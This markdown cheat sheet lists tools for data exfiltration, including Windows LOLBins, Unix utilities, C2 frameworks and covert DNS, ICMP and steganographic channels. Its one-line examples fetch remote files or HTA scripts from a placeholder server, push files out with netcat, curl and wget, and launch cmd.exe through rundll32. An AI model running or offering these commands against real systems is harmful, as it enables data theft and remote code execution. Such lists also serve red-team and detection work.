
# Tools for Data Exfiltration (Legal and Illegal)

## **1. Built-in Windows Binaries (LOLBins)**
Legitimate binaries available on most Windows systems that can be abused for exfiltration:

### **Command-line Utilities**
1. **Certutil**
   - Example: `certutil -urlcache -split -f http://<server>/file.exe`
   - Purpose: Certificate management but can download/upload files.

2. **Bitsadmin**
   - Example: `bitsadmin /transfer myJob /download /priority normal http://<server>/file C:\file`
   - Purpose: Manage Background Intelligent Transfer Service (BITS).

3. **PowerShell**
   - Example: `Invoke-WebRequest -Uri http://<server>/file -OutFile file`
   - Purpose: Task automation and management.

4. **Curl** (if installed)
   - Example: `curl -O http://<server>/file`
   - Purpose: Transfer data from or to a server.

5. **Wget** (if installed)
   - Example: `wget http://<server>/file -O file`
   - Purpose: Download files.

6. **FTP**
   - Example: `ftp -s:script.txt`
   - Purpose: Transfers files over FTP.

7. **Tftp**
   - Example: `tftp -i <server> get file`
   - Purpose: Transfers files using TFTP.

8. **Mshta**
   - Example: `mshta http://<server>/script.hta`
   - Purpose: Execute HTML applications, can exfiltrate data via web requests.

9. **Rundll32**
   - Example: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";CreateObject("WScript.Shell").Run("cmd.exe")`
   - Purpose: Run DLLs but can execute arbitrary commands/scripts.

10. **Certreq**
    - Purpose: Certificate requests but can be abused for data transfer.

11. **Robocopy**
    - Example: `robocopy <source> <destination> /mir`
    - Purpose: File copying and syncing, including network shares.

---

## **2. Linux/macOS Utilities**
1. **scp**
   - Example: `scp file user@<server>:<destination>`
   - Purpose: Secure file transfer over SSH.

2. **rsync**
   - Example: `rsync -avz file user@<server>:<destination>`
   - Purpose: File synchronization and transfer.

3. **Netcat**
   - Example: `nc <server> <port> < file`
   - Purpose: Send or receive data over the network.

4. **cURL**
   - Example: `curl -T file http://<server>/upload`
   - Purpose: Data transfer using multiple protocols.

5. **wget**
   - Example: `wget --post-file=file http://<server>/upload`
   - Purpose: Download or upload files.

6. **Python**
   - Example: `python -m http.server` or using Python scripts for exfiltration.
   - Purpose: Execute scripts for data transfer.

7. **SSH**
   - Example: `ssh user@<server> "cat > file" < file`
   - Purpose: Secure data transfer and command execution.

---

## **3. Cross-platform Tools**
1. **Rclone**
   - Purpose: Sync data to/from cloud services (Google Drive, Dropbox, etc.).

2. **SFTP**
   - Example: `sftp user@<server>`
   - Purpose: Secure file transfer protocol.

3. **HTTP Servers**
   - Tools like `SimpleHTTPServer` (Python), Apache, or nginx can act as servers to send/receive data.

4. **Cloud Storage Sync Tools**
   - Google Drive (gdrive CLI), Dropbox, OneDrive clients.

5. **TeamViewer/AnyDesk/Remote Desktop Tools**
   - Purpose: Remote control but can transfer files.

---

## **4. Third-party Tools (Often Used for Malicious Intent)**
1. **Cobalt Strike**
   - Purpose: Red team tool for penetration testing; often abused.

2. **Meterpreter** (part of Metasploit)
   - Purpose: Post-exploitation tool that can send/receive files.

3. **Exfiltration Frameworks**
   - **Exfil** (data over ICMP).
   - **DNSCat2** (data over DNS).

4. **Custom Scripts**
   - Python, PowerShell, Bash scripts tailored for exfiltration.

---

## **5. Network-based Tools**
1. **Wireshark/Tcpdump**
   - Purpose: Packet capturing but can extract sensitive data.

2. **Netsh**
   - Example: `netsh trace start capture=yes`
   - Purpose: Network diagnostics but can extract data.

3. **ICMP Exfiltration**
   - Tools: Ping or custom tools to send data using ICMP packets.

4. **DNS Exfiltration**
   - Tools: Dig, Nslookup, custom scripts to encode data in DNS queries.

---

## **6. Advanced and Covert Methods**
1. **Steganography Tools**
   - Tools like **Steghide** or **Outguess** to embed data in images or files.

2. **Clipboard Hijacking**
   - Abuse clipboard data for exfiltration.

3. **Covert Channels**
   - Use unused fields in protocols (e.g., TCP/UDP headers).

4. **Bluetooth Tools**
   - Transfer files via Bluetooth to nearby devices.
